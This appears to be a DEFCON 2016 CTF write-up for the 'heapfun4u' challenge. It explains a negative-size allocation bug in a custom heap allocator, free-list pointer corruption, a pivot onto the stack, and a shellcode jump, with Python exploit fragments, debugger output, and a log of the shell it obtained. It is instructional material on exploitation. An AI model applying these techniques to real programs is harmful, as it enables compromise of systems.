date: 2016-05-24 00:00:00
modified: 2016-05-24 00:00:00
title: DEFCON CTF 2016 - heapfun4u
author: hugsy
tags: pwn,defcon-2016,x86,heap
category: ctf

### Info ###

The vulnerable [file](http://s000.tinyupload.com/?file_id=00161391052849766745) was given with the following instructions:

    Guess what, it is a heap bug

So yes, we'll be dealing with some heap fun.

```bash
gef➤  !file ./heapfun4u
./heapfun4u: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=b019e6cbed93d55ebef500e8c4dec79ce592fa42, stripped
gef➤  checksec
[+] checksec for '/home/vagrant/heapfun4u'
Canary:                                           No
NX Support:                                       Yes
PIE Support:                                      No
No RPATH:                                         Yes
No RUNPATH:                                       Yes
Partial RelRO:                                    Yes
Full RelRO:                                       No
```

`heapfun4u` is a tool that manages its own heap allocator to allocate and free
buffers. On top of those actions, another command allows to write directly into
one of those buffers. The last command is a helper to leak an address in the
stack:

```bash
gef➤  c
Continuing.
[A]llocate Buffer
[F]ree Buffer
[W]rite Buffer
[N]ice guy
[E]xit
| N
Here you go: 0x7fffffffe16c
```

<!--more-->


### Vulnerability ###


Allocating N bytes will:

   - lookup in the free list (0x602558) for a free buffer of a bigger size. If
      not found:
   - create a buffer with the following structure:

```bash
struct __buffer {
    qword size;
    void data[N_rounded_size];
}
```

   - add a pointer to `struct __buffer->data` in an array at 0x6020A0 (in
       .bss)
   - store the size (N) of this buffer in an array at 0x6023C0


There are many vulnerabilities in `heapfun4u` but an interesting one, is the
fact that when allocating a new buffer, the tool fails to check the size of the
new buffer to create. This means that we can provide negative-sized buffer:

```bash
[A]llocate Buffer
[F]ree Buffer
[W]rite Buffer
[N]ice guy
[E]xit
| A
Size: -1
[A]llocate Buffer
[F]ree Buffer
[W]rite Buffer
[N]ice guy
[E]xit
| W
1) 0x7ffff7ff4008 -- -1
```

Which we confirm immediately in IDA:
```bash
.text:0000000000400A28 mov     edx, 0FFh       ; nbytes
.text:0000000000400A2D mov     rsi, rax        ; buf
.text:0000000000400A30 mov     edi, 0          ; fd
.text:0000000000400A35 call    _read           ;; read(0, &stdin_buffer, 0xFF)

.text:0000000000400A49 lea     rax, [rbp+stdin_buffer]
.text:0000000000400A50 mov     rdi, rax        ; nptr
.text:0000000000400A53 call    _atoi
.text:0000000000400A58 mov     [rbp+size], eax
.text:0000000000400A5B mov     ebx, cs:index
.text:0000000000400A61 mov     eax, [rbp+sz]
.text:0000000000400A64 mov     edi, eax
.text:0000000000400A66 call    allocate_buffer  ;; no check on size before call to allocate_buffer(size)
```

This is an issue because the `free_buffer(data_ptr)` assumes that it will find the
length of the chunk at `data_ptr - 8` and use this location to store a pointer
to the `head_free_list_ptr`.  This means that, at the next allocation after the
`free()`, this pointer (which we now control) will be dereferenced.


### Exploitation ###

#### Dereferencing an arbitrary location ####

To exploit this, we will use the vulnerability disclosed above to force the heap
allocator to make an allocation directly inside the stack (whose address is
known thanks to the "Nice guy" command). So we need to:

   1. allocate 3 chunks, the second allocated chunk must have a size of -1
   1. free the 3rd chunk
   1. free the 2nd chunk.

```bash

          |  size = N      |
          |  data          |
          |   ..           |
          |                |
          |                |
          |  ptr_to_stack  |
          |  size = -1     |
          |  size = M      |
          |  data          |
          |                |
          |                |

```

Upon the 2nd free, we will gain control of the `head_free_list_ptr`:

```python
  sz = 128
  allocate(s, sz)
  allocate(s, -1)
  allocate(s, 10)

  free(s, "3")
  free(s, "2")

  payload = "A"*(sz-8) + p64(0x4242424242424242)
  write(s, 1, payload)
```

The next allocation will attempt to dereference the address 0x4242424242424242
to see if it's a suitable buffer:

```python
  allocate(s, 0x200)
```

And as expected:

```bash
gef➤  c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[registers]──
$rax     0x4242424242424242 $rbx     0x0000000000000003 $rcx     0x00007f580ed92ac0 $rdx     0x0000000000000000 $rsp     0x00007ffceb5f8a70 $rbp     0x00007ffceb5f8ad0
$rsi     0x00007ffceb5f8ae3 $rdi     0x0000000000000200 $rip     0x0000000000400d77 $r8      0x00007f580efe1500 $r9      0x0000000000000200 $r10     0x000000000000000a
$r11     0x1999999999999999 $r12     0x00000000004006b0 $r13     0x00007ffceb5f8ce0 $r14     0x0000000000000000 $r15     0x0000000000000000 $cs      0x0000000000000033
$ss      0x000000000000002b $ds      0x0000000000000000 $es      0x0000000000000000 $fs      0x0000000000000000 $gs      0x0000000000000000 $eflags  [ PF IF RF ]
Flags: [ carry  PARITY  adjust  zero  sign  trap  INTERRUPT  direction  overflow  RESUME  virtualx86  identification ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[stack]──
0x00007ffceb5f8a70│+0x00: -0x1		← $sp
0x00007ffceb5f8a78│+0x08: 0x2000efe1740
0x00007ffceb5f8a80│+0x10: 0x00007f580ed92a35 → 0x0
0x00007ffceb5f8a88│+0x18: 0x00007ffceb5f8ae0 → "512[...]"
0x00007ffceb5f8a90│+0x20: 0x00007ffceb5f8ce0 → 0x1
0x00007ffceb5f8a98│+0x28: 0x2
0x00007ffceb5f8aa0│+0x30: 0x4242424242424242
0x00007ffceb5f8aa8│+0x38: 0x00000000004006b0 → xor ebp,ebp
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[code:i386:x86-64]──
0x400d67	 mov    QWORD PTR [rbp-0x8],rax
0x400d6b	 mov    rax,QWORD PTR [rbp-0x8]
0x400d6f	 mov    QWORD PTR [rbp-0x30],rax
0x400d73	 mov    rax,QWORD PTR [rbp-0x8]
0x400d77	 mov    rax,QWORD PTR [rax] 		 ← $pc
0x400d7a	 and    rax,0xfffffffffffffffc
0x400d7e	 lea    rdx,[rax-0x8]
0x400d82	 mov    rax,QWORD PTR [rbp-0x8]
[...]
```

We now need to create a good setup in the stack to have `heapfun4u` believe its
a valid region for allocation.


#### Pivoting to stack ####

To pivot to the stack, we first needed to know exactly the exactly of $rbp when
the last call to `allocate_buffer()` is made. Luckily, as said early, the
command "Nice guy" will provide use with such information.

The stack layout is hard to fully control at the level of the
`allocate_buffer()` function. However, this function is called by the `main()`
function, which uses a very large buffer (0x100 bytes) to store values read from stdin:

{% highlight bash%}
.text:0000000000400905 ; int __cdecl main(int, char **, char **)
.text:0000000000400905 main proc near
.text:0000000000400905
.text:0000000000400905 stdin_buffer= byte ptr -120h    ;; <<-- this buffer provides a good place to land reliably
.text:0000000000400905 sz= dword ptr -14h
```

Additionally, its location is very easy to pinpoint:

{% highlight bash%}
               |       |    RetAddr       |
context of     |       |   SFP of main    |
main()         |       |     size         |
               |       |  buffer[0x100]   |
               |       |                  |                                 |
               |       |                  |                                 |
               |       |                  |                                 |
               |       |                  |                                 |
               V       |                  |                                 |
               |       |    RetAddr       |                                 |
               |       |      SFP         |                                 |
               |       |                  |          to the stack of main()
allocate()     |       |                  |
               |       |                  |
               |       |                  |
               |       |                  |
               |       |                  |
               |       |                  |
```

So now, we can point `head_free_list_ptr` to a location we fully control. All we
need to write at this address a large value, for example 0x1000 so that when
inspecting this address, `allocate_buffer()` will believe the buffer in the stack
is large enough for the new allocation:

```python
padd = 'D'*126 + p64(0x1000) + 'B'*8 + 'C'*8
free(s, "2" + "\0" + padd)

allocate(s, 512)
```

We have now an allocation in stack:
```bash
[A]llocate Buffer
[F]ree Buffer
[W]rite Buffer
[N]ice guy
[E]xit
| W
1) 0x7f06cd628008 -- 128
2) 0x7f06cd628090 -- -1
3) 0x7f06cd628098 -- 10
4) 0x7fffffffe458 -- 512
^C
gef➤  xinfo 0x00007fffffffe458
────────────────────────────────────────────────────[ xinfo: 0x7fffffffe458 ]──────────────────────────────────────
Found 0x00007fffffffe458
Page: 0x00007ffffffde000 → 0x00007ffffffff000 (size=0x21000)
Permissions: rw-
Pathname: [stack]
Offset (from page): +0x20458
Inode: 0
```

This means that we have transformed it into a regular stack overflow, simply by
writing at the newly allocated address 0x7fffffffe458. Since, when allocating a
new buffer, `heapfun4u` calls `mmap()` with Read|Write|Execute, we have plenty
to location to drop our shellcode and jump to it.

This completes our execution steps.

#### Pwn ! ####

Run the
[exploit code](https://gist.github.com/hugsy/892495d2299189db06517ff9a0b6249b):

```bash
~/cur/heapfun4u $ ./heapfun4u.py
[+] Connected to 172.28.128.4:3957
Attach with GDB and hit Enter
[+] rbp = 0x7ffc8c5d7ca0
[+] rsp = 0x7ffc8c5d7c40
[+] 1st allocation ok
[+] 2nd allocation ok
[+] 3rd allocation ok
[+] Leaked mmap-ed areas: 0x7f9c522fd008
[+] Free(#3) ok
[+] Free(#2) ok
[+] Overwriting pointer ok
[+] Stack pivot ok
[+] Overwriting rip ok
[+] Trigger return to 7f9c522fd008
[+] Switching to interactive...

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

vagrant@ubuntu-wily-15:/home/vagrant$ id
id
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare) vagrant@ubuntu-wily-15:/home/vagrant$
```

At that time, my teammate from TheGoonies <a class="fa fa-twitter" href="https://twitter.com/@rick2600" target="_blank"> @rick2600</a> had also read the flag file, which was:

```text
The flag is: Oh noze you pwned my h33p.
```
